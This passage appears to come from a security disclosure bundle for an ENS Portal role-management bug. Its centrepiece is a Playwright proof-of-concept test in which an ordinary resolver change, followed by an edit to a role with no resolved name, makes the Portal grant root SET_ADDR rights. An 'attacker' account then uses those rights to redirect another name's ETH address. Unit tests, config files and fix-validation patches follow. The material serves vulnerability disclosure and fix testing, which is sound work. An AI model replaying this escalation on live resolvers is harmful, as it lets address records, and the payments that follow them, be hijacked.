  '0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe' as Address
const ROLE_SET_ADDR = 1n
const ROLE_SET_TEXT = 1n << 4n
const INDEXER_GRAPHQL_URL =
  process.env.INDEXER_GRAPHQL_URL ?? 'http://127.0.0.1:5855/graphql'
const EXPECT_INITIAL_RESOLVED =
  process.env.CAND001_EXPECT_INITIAL_RESOLVED === 'true'
const EXPECT_HARDFAIL = process.env.CAND001_EXPECT_HARDFAIL === 'true'
const ETH_REGISTRY = ensL1Contracts[supportedL1Chains.sepolia].ensRegistry.address

const resolverRecordsAbi = parseAbi([
  'function setText(bytes32 node, string key, string value)',
  'function setAddr(bytes32 node, uint256 coinType, bytes value)',
  'function addr(bytes32 node) view returns (address)',
])
const universalResolverAbi = parseAbi([
  'function resolve(bytes name, bytes data) view returns (bytes result, address resolver)',
])
const rolesChangedEvent = parseAbiItem(
  'event EACRolesChanged(uint256 indexed resource, address indexed account, uint256 oldRoleBitmap, uint256 newRoleBitmap)',
)
const registryAbi = parseAbi([
  'function getResolver(string label) view returns (address)',
])

type ResolverOverview = {
  nodeCount: number
  nodes: Array<{ name: string | null }>
  roles: Array<{
    account: string
    resource: string
    roleBitmap: string
    name: string | null
  }>
}

const fetchOverview = async (resolverAddress: Address) => {
  const response = await fetch(INDEXER_GRAPHQL_URL, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      query:
        'query($id:String!){resolver(id:$id){nodeCount nodes{name} roles{account resource roleBitmap name}}}',
      variables: { id: resolverAddress.toLowerCase() },
    }),
  })
  const json = (await response.json()) as {
    data?: { resolver?: ResolverOverview | null }
    errors?: unknown
  }
  if (json.errors) throw new Error(JSON.stringify(json.errors))
  return json.data?.resolver ?? null
}

const waitForOverview = async (
  resolverAddress: Address,
  predicate: (overview: ResolverOverview) => boolean,
  timeoutMs = 120_000,
) => {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    const overview = await fetchOverview(resolverAddress).catch(() => null)
    if (overview && predicate(overview)) return overview
    await new Promise((resolve) => setTimeout(resolve, 500))
  }
  throw new Error('Panoptes did not reach the expected resolver-change state')
}

type Fixture = {
  alphaName: string
  betaName: string
  resolverAddress: Address
  owner: Address
  attacker: Address
  alphaResource: `0x${string}`
  betaResource: `0x${string}`
  delegationGrantedBeforePortal: boolean
  unresolvedInFrozenPortal: boolean
  unresolvedBecausePagination: boolean
  nodeCount: number
  returnedNodeCount: number
  alphaTextRoleBefore: boolean
  betaAddrRoleBefore: boolean
  rootAddrRoleBefore: boolean
  expectedPanoptesAlphaResource: `0x${string}`
  indexedRole: { resource: `0x${string}` }
  onChainAlphaGrantEvent: {
    transactionHash: `0x${string}`
    blockNumber: string
    logIndex: number
    emitter: Address
    rawTopics: readonly `0x${string}`[]
    rawData: `0x${string}`
    decoded: {
      eventName: 'EACRolesChanged'
      resource: `0x${string}`
      account: Address
      oldRoleBitmap: string
      newRoleBitmap: string
    }
  }
  onChainNamedResourceEvent: {
    transactionHash: `0x${string}`
    blockNumber: string
    logIndex: number
    emitter: Address
    rawTopics: readonly `0x${string}`[]
    rawData: `0x${string}`
    decoded: {
      eventName: 'NamedResource'
      resource: `0x${string}`
      name: `0x${string}`
    }
  }
  contractEventResourceEqualsPortalComputedResource: boolean
  panoptesResourceEqualsEventWithLow32Cleared: boolean
  portalComputedResourceDiffersFromPanoptesResource: boolean
}

const resolveEthAddress = async (name: string) => {
  const call = encodeFunctionData({
    abi: resolverRecordsAbi,
    functionName: 'addr',
    args: [namehash(name)],
  })
  const [result, resolver] = await publicClient.readContract({
    address: UNIVERSAL_RESOLVER,
    abi: universalResolverAbi,
    functionName: 'resolve',
    args: [bytesToHex(packetToBytes(name)), call],
  })
  return {
    address: decodeFunctionResult({
      abi: resolverRecordsAbi,
      functionName: 'addr',
      data: result,
    }),
    resolver,
  }
}

test.describe('CAND-001 cross-resource root over-grant', () => {
  test.describe.configure({ timeout: 240_000 })

  test('detached alpha role becomes unresolved and grants root authority over beta', async ({
    portalPage: page,
    wallet,
    accounts,
  }) => {
    const fixture = JSON.parse(await readFile(FIXTURE_PATH, 'utf8')) as Fixture
    const resolver = fixture.resolverAddress
    const owner = accounts.getAddress('user')
    const attacker = accounts.getAddress('user3')
    const negativeControl = accounts.getAddress('user4')
    const payout = attacker
    const alphaResource = BigInt(fixture.alphaResource)
    const betaResource = BigInt(fixture.betaResource)
    const betaNode = namehash(fixture.betaName)

    expect(fixture.owner.toLowerCase()).toBe(owner.toLowerCase())
    expect(fixture.attacker.toLowerCase()).toBe(attacker.toLowerCase())
    expect(fixture.delegationGrantedBeforePortal).toBe(true)
    expect(fixture.unresolvedInFrozenPortal).toBe(true)
    expect(fixture.unresolvedBecausePagination).toBe(false)
    expect(fixture.nodeCount).toBe(2)
    expect(fixture.returnedNodeCount).toBe(2)
    expect(fixture.alphaTextRoleBefore).toBe(true)
    expect(fixture.betaAddrRoleBefore).toBe(false)
    expect(fixture.rootAddrRoleBefore).toBe(false)
    expect(fixture.onChainAlphaGrantEvent.decoded.account.toLowerCase()).toBe(
      attacker.toLowerCase(),
    )
    expect(fixture.onChainAlphaGrantEvent.decoded.resource.toLowerCase()).toBe(
      fixture.alphaResource.toLowerCase(),
    )
    expect(fixture.indexedRole.resource.toLowerCase()).toBe(
      fixture.expectedPanoptesAlphaResource.toLowerCase(),
    )
    expect(fixture.indexedRole.resource.toLowerCase()).not.toBe(
      fixture.onChainAlphaGrantEvent.decoded.resource.toLowerCase(),
    )
    expect(fixture.onChainNamedResourceEvent.decoded.resource.toLowerCase()).toBe(
      fixture.alphaResource.toLowerCase(),
    )
    expect(fixture.contractEventResourceEqualsPortalComputedResource).toBe(true)
    expect(fixture.panoptesResourceEqualsEventWithLow32Cleared).toBe(true)
    expect(fixture.portalComputedResourceDiffersFromPanoptesResource).toBe(true)

    const initialOverview = await fetchOverview(resolver)
    if (!initialOverview) throw new Error('missing initial Resolver A overview')
    const initialAlphaPresent = initialOverview.nodes.some(
      ({ name }) => name?.toLowerCase() === fixture.alphaName.toLowerCase(),
    )
    const initialRolePresent = initialOverview.roles.some(
      (role) =>
        role.account.toLowerCase() === attacker.toLowerCase() &&
        (BigInt(role.roleBitmap) & ROLE_SET_TEXT) !== 0n,
    )
    expect(initialAlphaPresent).toBe(true)
    expect(initialRolePresent).toBe(true)

    // Positive initial-scope control: A can use the legitimate narrow alpha
    // text role, proving the starting permission is real rather than cosmetic.
    const alphaTextHash = await walletClient.sendTransaction({
      account: attacker,
      to: resolver,
      data: encodeFunctionData({
        abi: resolverRecordsAbi,
        functionName: 'setText',
        args: [namehash(fixture.alphaName), 'com.twitter', 'alpha-delegate'],
      }),
    })
    const alphaTextReceipt = await publicClient.waitForTransactionReceipt({
      hash: alphaTextHash,
    })
    expect(alphaTextReceipt.status).toBe('success')

    // Give unrelated beta a safe victim record and resolve it through the
    // official Universal Resolver before any Portal edit.
    const victimRecordHash = await walletClient.sendTransaction({
      account: owner,
      to: resolver,
      data: encodeFunctionData({
        abi: resolverRecordsAbi,
        functionName: 'setAddr',
        args: [betaNode, 60n, owner],
      }),
    })
    await publicClient.waitForTransactionReceipt({ hash: victimRecordHash })
    const resolutionBefore = await resolveEthAddress(fixture.betaName)
    expect(resolutionBefore.address.toLowerCase()).toBe(owner.toLowerCase())

    const betaAttackData = encodeFunctionData({
      abi: resolverRecordsAbi,
      functionName: 'setAddr',
      args: [betaNode, 60n, payout],
    })

    // CONTROL A: A cannot perform the exact beta terminal action before the
    // Portal bug. The unrelated negative-control account also cannot do it.
    await expect(
      publicClient.call({ account: attacker, to: resolver, data: betaAttackData }),
    ).rejects.toThrow()
    await expect(
      publicClient.call({
        account: negativeControl,
        to: resolver,
        data: betaAttackData,
      }),
    ).rejects.toThrow()

    const [alphaTextBefore, betaAddrBefore, rootAddrBefore] = await Promise.all([
      publicClient.readContract({
        address: resolver,
        abi: permissionedResolverHasRolesSnippet,
        functionName: 'hasRoles',
        args: [alphaResource, ROLE_SET_TEXT, attacker],
      }),
      publicClient.readContract({
        address: resolver,
        abi: permissionedResolverHasRolesSnippet,
        functionName: 'hasRoles',
        args: [betaResource, ROLE_SET_ADDR, attacker],
      }),
      publicClient.readContract({
        address: resolver,
        abi: permissionedResolverHasRootRolesSnippet,
        functionName: 'hasRootRoles',
        args: [ROLE_SET_ADDR, attacker],
      }),
    ])
    expect(alphaTextBefore).toBe(true)
    expect(betaAddrBefore).toBe(false)
    expect(rootAddrBefore).toBe(false)

    // CONTROL B: A cannot self-create the root permission. Only V's mistaken
    // Portal transaction can produce the demonstrated authority expansion.
    const directRootGrantData = encodeFunctionData({
      abi: permissionedResolverGrantRootRolesSnippet,
      functionName: 'grantRootRoles',
      args: [ROLE_SET_ADDR, attacker],
    })
    await expect(
      publicClient.call({
        account: attacker,
        to: resolver,
        data: directRootGrantData,
      }),
    ).rejects.toThrow()

    const capturedWalletRequests: Array<{
      method: string
      params: Array<{ data: `0x${string}`; from: Address; to: Address }>
    }> = []
    const originalWalletRequest = wallet.request.bind(wallet)
    wallet.request = async (request) => {
      if (request.method === 'eth_sendTransaction') {
        capturedWalletRequests.push(
          JSON.parse(JSON.stringify(request)) as (typeof capturedWalletRequests)[number],
        )
      }
      return originalWalletRequest(request)
    }

    await connectWithHeadlessWallet(page, wallet)

    // Under the isolated resource-normalization control patch, this proves
    // the role is initially mapped to alpha. Frozen code instead shows the
    // already-known representation-mismatch trigger as blank.
    await page.goto(`${PORTAL_APP_URL}/resolver/${resolver}/roles`)
    await expect(page.getByRole('heading', { name: 'Roles' })).toBeVisible({
      timeout: 30_000,
    })
    const attackerShort = `${attacker.toLowerCase().slice(0, 6)}…${attacker
      .toLowerCase()
      .slice(-4)}`
    const initialRoleRow = page.locator('tbody tr').filter({ hasText: attackerShort })
    await expect(initialRoleRow).toHaveCount(1, { timeout: 30_000 })
    if (EXPECT_INITIAL_RESOLVED) {
      await expect(initialRoleRow.locator('td').nth(1)).toContainText(
        fixture.alphaName,
      )
    } else {
      await expect(initialRoleRow.locator('td').nth(1)).toHaveText('')
    }

    // Normal Portal change-resolver workflow: deploy Resolver B, then attach
    // alpha to it. Resolver A's historical role state is not modified.
    await page.goto(`${PORTAL_APP_URL}/${fixture.alphaName}/change-resolver`)
    await expect(page.getByRole('heading', { name: 'Change resolver' })).toBeVisible({
      timeout: 30_000,
    })
    await page.getByRole('switch', { name: /Use custom resolver/ }).click()
    await page.getByRole('button', { name: 'Save changes' }).click()
    const changeDialog = page.locator(
      '[data-slot="dialog-content"][data-state="open"]',
    )
    await expect(changeDialog).toBeVisible({ timeout: 30_000 })
    const alphaLabel = fixture.alphaName.split('.')[0]!
    let resolverB = resolver
    const changeDeadline = Date.now() + 180_000
    while (
      resolverB.toLowerCase() === resolver.toLowerCase() &&
      Date.now() < changeDeadline
    ) {
      const openWallet = changeDialog.getByRole('button', {
        name: /open wallet/i,
      })
      if (await openWallet.isVisible().catch(() => false)) {
        await openWallet.click()
        await wallet.authorize(Web3RequestKind.SendTransaction)
      }
      const waitingButton = changeDialog.getByRole('button', {
        name: /^Waiting\.\.\.$/i,
      })
      if (await waitingButton.isVisible().catch(() => false)) {
        const iconWalletButton = waitingButton.locator(
          'xpath=preceding-sibling::button[1]',
        )
        if (await iconWalletButton.isVisible().catch(() => false)) {
          await iconWalletButton.click()
          await wallet.authorize(Web3RequestKind.SendTransaction)
        }
      }
      const primary = changeDialog.getByRole('button', {
        name: /^(Start|Next|Done)$/i,
      })
      if (
        (await primary.isVisible().catch(() => false)) &&
        (await primary.isEnabled().catch(() => false))
      ) {
        await primary.click()
      }
      resolverB = await publicClient.readContract({
        address: ETH_REGISTRY,
        abi: registryAbi,
        functionName: 'getResolver',
        args: [alphaLabel],
      })
      if (resolverB.toLowerCase() === resolver.toLowerCase()) {
        await page.waitForTimeout(300)
      }
    }
    expect(resolverB.toLowerCase()).not.toBe(resolver.toLowerCase())

    const overviewAfterResolverChange = await waitForOverview(
      resolver,
      (overview) => {
        const names = overview.nodes.map(({ name }) => name?.toLowerCase())
        const roleRemains = overview.roles.some(
          (role) =>
            role.account.toLowerCase() === attacker.toLowerCase() &&
            (BigInt(role.roleBitmap) & ROLE_SET_TEXT) !== 0n,
        )
        return (
          !names.includes(fixture.alphaName.toLowerCase()) &&
          names.includes(fixture.betaName.toLowerCase()) &&
          roleRemains
        )
      },
    )
    const alphaPresentAfterResolverChange =
      overviewAfterResolverChange.nodes.some(
        ({ name }) => name?.toLowerCase() === fixture.alphaName.toLowerCase(),
      )
    const betaPresentAfterResolverChange = overviewAfterResolverChange.nodes.some(
      ({ name }) => name?.toLowerCase() === fixture.betaName.toLowerCase(),
    )
    const rolePresentAfterResolverChange = overviewAfterResolverChange.roles.some(
      (role) =>
        role.account.toLowerCase() === attacker.toLowerCase() &&
        (BigInt(role.roleBitmap) & ROLE_SET_TEXT) !== 0n,
    )
    expect(alphaPresentAfterResolverChange).toBe(false)
    expect(betaPresentAfterResolverChange).toBe(true)
    expect(rolePresentAfterResolverChange).toBe(true)

    await page.goto(`${PORTAL_APP_URL}/resolver/${resolver}/roles`)
    await expect(page.getByRole('heading', { name: 'Roles' })).toBeVisible({
      timeout: 30_000,
    })
    const row = page.locator('tbody tr').filter({ hasText: attackerShort })
    await expect(row).toHaveCount(1, { timeout: 30_000 })
    await expect(row.locator('td').nth(1)).toHaveText('')
    await row.getByRole('button', { name: 'Edit user roles' }).click()

    if (EXPECT_HARDFAIL) {
      await expect(page.locator('#ROLE_SET_ADDR-manager')).toBeDisabled()
      await expect(
        page.getByRole('button', { name: 'Save', exact: true }),
      ).toHaveCount(0)
      await expect(page.getByRole('button', { name: 'Remove user' })).toHaveCount(
        0,
      )
      const [rootAddrRole, betaAddrRole] = await Promise.all([
        publicClient.readContract({
          address: resolver,
          abi: permissionedResolverHasRootRolesSnippet,
          functionName: 'hasRootRoles',
          args: [ROLE_SET_ADDR, attacker],
        }),
        publicClient.readContract({
          address: resolver,
          abi: permissionedResolverHasRolesSnippet,
          functionName: 'hasRoles',
          args: [betaResource, ROLE_SET_ADDR, attacker],
        }),
      ])
      expect(rootAddrRole).toBe(false)
      expect(betaAddrRole).toBe(false)
      await expect(
        publicClient.call({
          account: attacker,
          to: resolver,
          data: betaAttackData,
        }),
      ).rejects.toThrow()
      const hardfailResult = {
        candidateFix: 'unresolved authorization resource is read-only',
        compatibilityControl: 'initial alpha row resolved before detach',
        resolverChangeTrigger: {
          resolverA: resolver,
          resolverB,
          initialAlphaPresent,
          initialRolePresent,
          initialPortalMappedName: EXPECT_INITIAL_RESOLVED
            ? fixture.alphaName
            : null,
          alphaPresentAfterResolverChange,
          betaPresentAfterResolverChange,
          rolePresentAfterResolverChange,
        },
        overGrantSavePresent: false,
        removeUserPresent: false,
        rootAddrRole,
        betaAddrRole,
        attackerBetaActionRejected: true,
      }
      const evidenceDir = process.env.POC_EVIDENCE_DIR
      if (evidenceDir) {
        await mkdir(evidenceDir, { recursive: true })
        await writeFile(
          `${evidenceDir}/hardfail-complete-result.json`,
          `${JSON.stringify(hardfailResult, null, 2)}\n`,
          'utf8',
        )
      }
      console.log(JSON.stringify(hardfailResult, null, 2))
      return
    }

    await page.locator('#ROLE_SET_ADDR-manager').click()
    const saveButton = page.getByRole('button', { name: 'Save', exact: true })
    await expect(saveButton).toBeEnabled()

    const blockBeforeGrant = await publicClient.getBlockNumber({ cacheTime: 0 })
    await saveButton.click()
    const dialog = page.locator('[data-slot="dialog-content"][data-state="open"]')
    await expect(dialog).toBeVisible({ timeout: 30_000 })
    const deadline = Date.now() + 120_000
    let rootGranted = false
    while (!rootGranted && Date.now() < deadline) {
      const openWallet = dialog.getByRole('button', { name: /open wallet/i })
      if (await openWallet.isVisible().catch(() => false)) {
        await openWallet.click()
        await wallet.authorize(Web3RequestKind.SendTransaction)
      }
      const primary = dialog.getByRole('button', { name: /^(Start|Next|Done)$/i })
      if (
        (await primary.isVisible().catch(() => false)) &&
        (await primary.isEnabled().catch(() => false))
      ) {
        await primary.click()
      }
      rootGranted = await publicClient.readContract({
        address: resolver,
        abi: permissionedResolverHasRootRolesSnippet,
        functionName: 'hasRootRoles',
        args: [ROLE_SET_ADDR, attacker],
      })
      if (!rootGranted) await page.waitForTimeout(300)
    }
    expect(rootGranted).toBe(true)

    const blockAfterGrant = await publicClient.getBlockNumber({ cacheTime: 0 })
    const grantLogs = await publicClient.getLogs({
      address: resolver,
      event: rolesChangedEvent,
      args: { resource: 0n, account: attacker },
      fromBlock: blockBeforeGrant,
      toBlock: blockAfterGrant,
    })
    const grantLog = grantLogs.find(
      (log) => ((log.args.newRoleBitmap ?? 0n) & ROLE_SET_ADDR) !== 0n,
    )
    if (!grantLog?.transactionHash) {
      throw new Error('Portal-produced root grant event was not found')
    }
    const generatedTransaction = await publicClient.getTransaction({
      hash: grantLog.transactionHash,
    })
    const grantReceipt = await publicClient.getTransactionReceipt({
      hash: grantLog.transactionHash,
    })
    const decoded = decodeFunctionData({
      abi: permissionedResolverGrantRootRolesSnippet,
      data: generatedTransaction.input,
    })
    expect(decoded.functionName).toBe('grantRootRoles')
    expect(decoded.args).toEqual([ROLE_SET_ADDR, attacker])
    expect(grantReceipt.status).toBe('success')
    expect(
      capturedWalletRequests.some(
        (request) =>
          request.params[0]?.to.toLowerCase() === resolver.toLowerCase() &&
          request.params[0]?.data.toLowerCase() ===
            generatedTransaction.input.toLowerCase(),
      ),
    ).toBe(true)

    const betaAddrAfterGrant = await publicClient.readContract({
      address: resolver,
      abi: permissionedResolverHasRolesSnippet,
      functionName: 'hasRoles',
      args: [betaResource, ROLE_SET_ADDR, attacker],
    })
    expect(betaAddrAfterGrant).toBe(true)

    // The exact beta action that reverted before now succeeds as A.
    const attackHash = await walletClient.sendTransaction({
      account: attacker,
      to: resolver,
      data: betaAttackData,
    })
    const attackReceipt = await publicClient.waitForTransactionReceipt({
      hash: attackHash,
    })
    expect(attackReceipt.status).toBe('success')
    const resolutionAfter = await resolveEthAddress(fixture.betaName)
    expect(resolutionAfter.address.toLowerCase()).toBe(payout.toLowerCase())

    // Recovery: V revokes only the erroneous root SET_ADDR and restores beta.
    const revokeHash = await walletClient.sendTransaction({
      account: owner,
      to: resolver,
      data: encodeFunctionData({
        abi: permissionedResolverRevokeRootRolesSnippet,
        functionName: 'revokeRootRoles',
        args: [ROLE_SET_ADDR, attacker],
      }),
    })
    const revokeReceipt = await publicClient.waitForTransactionReceipt({
      hash: revokeHash,
    })
    const restoreHash = await walletClient.sendTransaction({
      account: owner,
      to: resolver,
      data: encodeFunctionData({
        abi: resolverRecordsAbi,
        functionName: 'setAddr',
        args: [betaNode, 60n, owner],
      }),
    })
    const restoreReceipt = await publicClient.waitForTransactionReceipt({
      hash: restoreHash,
    })
    const [rootAfterRecovery, betaAfterRecovery, alphaTextAfterRecovery] =
      await Promise.all([
        publicClient.readContract({
          address: resolver,
          abi: permissionedResolverHasRootRolesSnippet,
          functionName: 'hasRootRoles',
          args: [ROLE_SET_ADDR, attacker],
        }),
        publicClient.readContract({
          address: resolver,
          abi: permissionedResolverHasRolesSnippet,
          functionName: 'hasRoles',
          args: [betaResource, ROLE_SET_ADDR, attacker],
        }),
        publicClient.readContract({
          address: resolver,
          abi: permissionedResolverHasRolesSnippet,
          functionName: 'hasRoles',
          args: [alphaResource, ROLE_SET_TEXT, attacker],
        }),
      ])
    const resolutionAfterRecovery = await resolveEthAddress(fixture.betaName)
    expect(revokeReceipt.status).toBe('success')
    expect(restoreReceipt.status).toBe('success')
    expect(rootAfterRecovery).toBe(false)
    expect(betaAfterRecovery).toBe(false)
    expect(alphaTextAfterRecovery).toBe(true)
    expect(resolutionAfterRecovery.address.toLowerCase()).toBe(owner.toLowerCase())
    await expect(
      publicClient.call({ account: attacker, to: resolver, data: betaAttackData }),
    ).rejects.toThrow()

    const result = {
      actorModel: { owner, attacker, negativeControl, payout },
      alphaName: fixture.alphaName,
      betaName: fixture.betaName,
      completeNodeProjection: {
        nodeCount: fixture.nodeCount,
        returnedNodeCount: fixture.returnedNodeCount,
        paginationUsed: false,
      },
      resolverChangeTrigger: {
        resolverA: resolver,
        resolverB,
        initialAlphaPresent,
        initialRolePresent,
        alphaPresentAfterResolverChange,
        betaPresentAfterResolverChange,
        rolePresentAfterResolverChange,
        oldResolverNodeCountAfterChange: overviewAfterResolverChange.nodeCount,
        initialPortalMappedName: EXPECT_INITIAL_RESOLVED
          ? fixture.alphaName
          : null,
        initialPortalRowResolvedUnderCompatibilityFix:
          EXPECT_INITIAL_RESOLVED,
        note: EXPECT_INITIAL_RESOLVED
          ? 'The compatibility-only control resolves alpha before detach. A normal resolver change then removes alpha from Resolver A nodes while its role remains, independently recreating the unresolved state.'
          : 'Frozen Portal is already unresolved before detach because of the measured Panoptes representation difference. A normal resolver change independently removes alpha from Resolver A nodes while its role remains.',
      },
      onChainResourceProvenance: {
        alphaGrantEvent: fixture.onChainAlphaGrantEvent,
        namedResourceEvent: fixture.onChainNamedResourceEvent,
        panoptesResource: fixture.indexedRole.resource,
        portalComputedResource: fixture.alphaResource,
        contractEventEqualsPortalComputed: true,
        panoptesEqualsEventWithLow32Cleared: true,
        portalComputedResourceDiffersFromPanoptes: true,
      },
      beforeBug: {
        alphaTextRole: alphaTextBefore,
        alphaTextActionStatus: alphaTextReceipt.status,
        betaAddrRole: betaAddrBefore,
        rootAddrRole: rootAddrBefore,
        attackerBetaActionRejected: true,
        negativeControlBetaActionRejected: true,
        attackerDirectRootGrantRejected: true,
        betaResolution: resolutionBefore,
      },
      portalGrant: {
        rawWalletRequests: capturedWalletRequests,
        transactionHash: generatedTransaction.hash,
        from: generatedTransaction.from,
        to: generatedTransaction.to,
        chainId: generatedTransaction.chainId,
        value: generatedTransaction.value.toString(),
        data: generatedTransaction.input,
        decodedFunction: decoded.functionName,
        decodedArguments: [ROLE_SET_ADDR.toString(), attacker],
        receiptStatus: grantReceipt.status,
      },
      afterBug: {
        rootAddrRole: rootGranted,
        effectiveBetaAddrRole: betaAddrAfterGrant,
        attackerBetaActionHash: attackHash,
        attackerBetaActionStatus: attackReceipt.status,
        betaResolution: resolutionAfter,
      },
      recovery: {
        rootRevokeHash: revokeHash,
        recordRestoreHash: restoreHash,
        rootAddrRole: rootAfterRecovery,
        betaAddrRole: betaAfterRecovery,
        originalAlphaTextRolePreserved: alphaTextAfterRecovery,
        betaResolution: resolutionAfterRecovery,
        futureAttackerBetaActionRejected: true,
      },
      controlA: 'PASS: exact beta action impossible before and succeeds after',
      controlB: 'PASS: attacker cannot self-grant root authority',
    }
    const evidenceDir = process.env.POC_EVIDENCE_DIR
    if (evidenceDir) {
      await mkdir(evidenceDir, { recursive: true })
      await writeFile(
        `${evidenceDir}/complete-result.json`,
        `${JSON.stringify(result, null, 2)}\n`,
        'utf8',
      )
    }
    console.log(JSON.stringify(result, null, 2))
  })
})
```

#### `poc/cand001-empty-name.test.ts`

```ts
import {
  permissionedResolverAuthorizeNameRolesSnippet,
  permissionedResolverGrantRootRolesSnippet,
  permissionedResolverRevokeRootRolesSnippet,
} from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import { type Address, decodeFunctionData } from 'viem'
import { packetToBytes } from 'viem/ens'
import { sepolia } from 'viem/chains'
import { describe, expect, it } from 'vitest'
import { resolverRoles } from '@/lib/roles/resolverRoles'
import { prepareGrantResolverRolesTransaction } from './grantResolverRoles'
import { prepareRevokeResolverRolesTransaction } from './revokeResolverRoles'

const OWNER = '0x7Bc153b2a4C8a2f3428bd0da77a901b81c6dD809' as Address
const DELEGATE = '0x2245606Dd6B3ae61205fCf8c843E200CC2f1123d' as Address
const RESOLVER = '0x666b3d735e366bb8755b65cb5bf7a14c7f41eb23' as Address

// biome-ignore lint/suspicious/noExplicitAny: minimal pure-builder client
const walletClient = { account: { address: OWNER }, chain: sepolia } as any

function requestData(intent: ReturnType<typeof prepareGrantResolverRolesTransaction>) {
  expect(intent.request.type).toBe('eoa')
  if (intent.request.type !== 'eoa' || !intent.request.data) {
    throw new Error('expected EOA calldata')
  }
  return intent.request.data
}

describe('CAND-001 unresolved-name fallback', () => {
  it('turns the sidebar empty-string fallback into grantRootRoles', () => {
    const intent = prepareGrantResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: '',
      account: DELEGATE,
      roles: ['ROLE_SET_ADDR'],
      walletClient,
      chainId: sepolia.id,
    })
    const decoded = decodeFunctionData({
      abi: permissionedResolverGrantRootRolesSnippet,
      data: requestData(intent),
    })
    expect(decoded.functionName).toBe('grantRootRoles')
    expect(decoded.args).toEqual([resolverRoles.ROLE_SET_ADDR, DELEGATE])
  })

  it('turns the sidebar empty-string fallback into revokeRootRoles', () => {
    const intent = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: '',
      account: DELEGATE,
      roles: ['ROLE_SET_ADDR'],
      walletClient,
      chainId: sepolia.id,
    })
    expect(intent.request.type).toBe('eoa')
    if (intent.request.type !== 'eoa' || !intent.request.data) {
      throw new Error('expected EOA calldata')
    }
    const decoded = decodeFunctionData({
      abi: permissionedResolverRevokeRootRolesSnippet,
      data: intent.request.data,
    })
    expect(decoded.functionName).toBe('revokeRootRoles')
    expect(decoded.args).toEqual([resolverRoles.ROLE_SET_ADDR, DELEGATE])
  })

  it('keeps a mapped name name-scoped and encodes exact DNS bytes', () => {
    const name = 'known.eth'
    const intent = prepareGrantResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name,
      account: DELEGATE,
      roles: ['ROLE_SET_ADDR'],
      walletClient,
      chainId: sepolia.id,
    })
    const decoded = decodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      data: requestData(intent),
    })
    expect(decoded.functionName).toBe('authorizeNameRoles')
    expect(decoded.args).toEqual([
      `0x${Buffer.from(packetToBytes(name)).toString('hex')}`,
      resolverRoles.ROLE_SET_ADDR,
      DELEGATE,
      true,
    ])
    expect(decoded.args[0]).not.toBe('0x00')
  })
})
```

#### `poc/docker-compose.override.yml`

```yaml
services:
  anvil:
    ports: !override
      - "8754:8545"
  panoptes-api:
    ports: !override
      - "5855:5655"

networks:
  e2e:
    name: enscand001v5review-e2e
```

#### `poc/panoptes-contracts.cand001.json`

```json
{
  "_comment": "CAND-001 v4 isolated two-name lifecycle; active addresses come from frozen ENSjs Sepolia definitions; unchanged fields retain the official E2E values.",
  "temporary_registrar": "0x0000000000000000000000000000000000000000",
  "old_ens_registry": "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",
  "old_public_resolver": "0x5239A812ec9A62F46dbb5de8f346C8eFe7553A9f",
  "ens_registry": "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",
  "base_registrar": "0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85",
  "eth_registrar_controller": "0xfb3cE5D01e0f33f41DbB39035dB9745962F1f968",
  "public_resolver": "0x5239A812ec9A62F46dbb5de8f346C8eFe7553A9f",
  "reverse_registrar": "0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6",
  "name_wrapper": "0x0635513f179D50A207757E05759CbD106d7dFcE8",
  "root_registry": "0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
  "eth_registry": "0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
  "registry_datastore": "0x5a9236e72a66d3e08b83dcf489b4d850792b6009",
  "eth_reverse_registrar": "0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6",
  "l2_eth_registry": "0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
  "l2_eth_registrar": "0xa88553F454b77203B0D036A05c894d555EAAa2Cc",
  "l2_registry_datastore": "0x5a9236e72a66d3e08b83dcf489b4d850792b6009",
  "migration_helper": "0x1D8c7aA9862F9b823309Ad87A4864Fb27C575e85",
  "locked_migration_controller": "0x5c39E36a69A9897F08954c71aCB1F36E0Bd4f409",
  "unlocked_migration_controller": "0x2FCf83232b93bD29C59dB18AaA1D4b62e9f9FC73",
  "v1_deployment_block": 11633815,
  "l1_deployment_block": 11633815,
  "l2_deployment_block": 11633815,
  "temp_registrar_start_block": 11633815,
  "v1_migration_block": 11633815,
  "name_wrapper_deployment_block": 11633815
}
```

#### `fix-validation/panoptes-resource-compatibility-control.patch`

```diff
diff --git a/apps/portal/src/lib/roles/resolverRoles.ts b/apps/portal/src/lib/roles/resolverRoles.ts
index 5fa5c41..8a730b5 100644
--- a/apps/portal/src/lib/roles/resolverRoles.ts
+++ b/apps/portal/src/lib/roles/resolverRoles.ts
@@ -140,6 +140,12 @@ export const computeNameResource = (name: string): string =>
     encodePacked(['bytes32', 'bytes32'], [namehash(name), ZERO_BYTES32]),
   )
 
+// Experimental compatibility-only control: match the resource representation
+// currently returned by Panoptes. This intentionally does NOT add the
+// candidate-specific unresolved-scope fail-closed fix.
+const toPanoptesRoleResource = (resource: string): string =>
+  `0x${(BigInt(resource) & ~0xffffffffn).toString(16).padStart(64, '0')}`
+
 /**
  * Build a lookup map from resource hash → node name using the resolver's
  * node list. ROOT_RESOURCE maps to '(root)'.
@@ -152,7 +158,10 @@ export const buildResourceToNameMap = (
 
   for (const node of nodes) {
     if (node.name) {
-      map.set(computeNameResource(node.name).toLowerCase(), node.name)
+      map.set(
+        toPanoptesRoleResource(computeNameResource(node.name)).toLowerCase(),
+        node.name,
+      )
     }
   }
```

#### `fix-validation/candidate-hardfail-fix.patch`

```diff
diff --git a/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx b/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx
index 890971b..a3a6efc 100644
